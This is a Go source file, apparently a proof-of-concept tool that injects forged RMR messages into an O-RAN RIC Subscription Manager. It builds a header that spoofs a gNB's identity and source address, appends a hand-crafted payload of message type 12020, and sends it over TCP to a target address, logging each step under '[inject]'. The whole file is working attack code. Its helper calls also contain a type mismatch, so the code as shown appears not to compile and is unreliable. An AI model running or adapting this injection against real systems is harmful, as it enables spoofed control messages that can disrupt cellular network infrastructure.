package main

import (
	"fmt"
	"net"
	"os"
	"time"
)

func put(buf []byte, off int, v int32) {
	buf[off] = byte(v >> 24)
	buf[off+1] = byte(v >> 16)
	buf[off+2] = byte(v >> 8)
	buf[off+3] = byte(v)
}

// uta_mhdr_t (v3): mtype(4) plen(4) rmr_ver(4) xid(32) sid(32) src(64)
//                  meid(32) ts(16) flags(4) len0(4) len1(4) len2(4) len3(4)
//                  sub_id(4) srcip(64)
// Total: 4+4+4+32+32+64+32+16+4+4+4+4+4+4+64 = 276 bytes
func buildRMRHeader(mtype int, payloadLen int) []byte {
	hdr := make([]byte, 276)
	off := 0
	put(hdr, off, mtype); off += 4
	put(hdr, off, payloadLen); off += 4
	put(hdr, off, 3); off += 4                  // rmr_ver=3
	off += 32                                   // xid (zeros)
	copy(hdr[off:], "gnb_0115_100_00025b"); off += 32 // sid
	copy(hdr[off:], "10.0.2.1:4560"); off += 64       // src
	copy(hdr[off:], "gnb_0115_100_00025b"); off += 32 // meid
	off += 16                                   // ts (zeros)
	put(hdr, off, 0); off += 4                  // flags
	put(hdr, off, 276); off += 4                // len0 = sizeof(uta_mhdr_t)
	put(hdr, off, 0); off += 4                  // len1 trace
	put(hdr, off, 0); off += 4                  // len2
	put(hdr, off, 0); off += 4                  // len3
	put(hdr, off, -1); off += 4                 // sub_id
	copy(hdr[off:], "10.0.2.1:4560")            // srcip
	return hdr
}

func main() {
	submgrAddr := "10.0.2.13:4560"
	if len(os.Args) > 1 { submgrAddr = os.Args[1] }
	payload := []byte{
		0x00, 0x0c, 0x00, 0x14, 0x00, 0x00, 0x01, 0x00, 0x3c, 0x00,
		0x0d, 0x01, 0x00, 0x3d, 0x00, 0x08, 0x00, 0x00, 0x7b, 0x00,
		0x07, 0x00, 0x02, 0x56,
	}
	hdr := buildRMRHeader(12020, len(payload))
	fmt.Printf("[inject] hdr=%d payload=%d total=%d\n", len(hdr), len(payload), len(hdr)+len(payload))
	conn, err := net.Dial("tcp", submgrAddr)
	if err != nil {
		fmt.Printf("[inject] connect error: %v\n", err)
		os.Exit(1)
	}
	msg := append(hdr, payload...)
	n, err := conn.Write(msg)
	if err != nil {
		fmt.Printf("[inject] write error: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("[inject] sent %d bytes\n", n)
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	buf := make([]byte, 256)
	rn, rerr := conn.Read(buf)
	if rerr != nil {
		fmt.Printf("[inject] no response\n")
	} else {
		fmt.Printf("[inject] response: %x\n", buf[:rn])
	}
	conn.Close()
	fmt.Println("[inject] done")
}
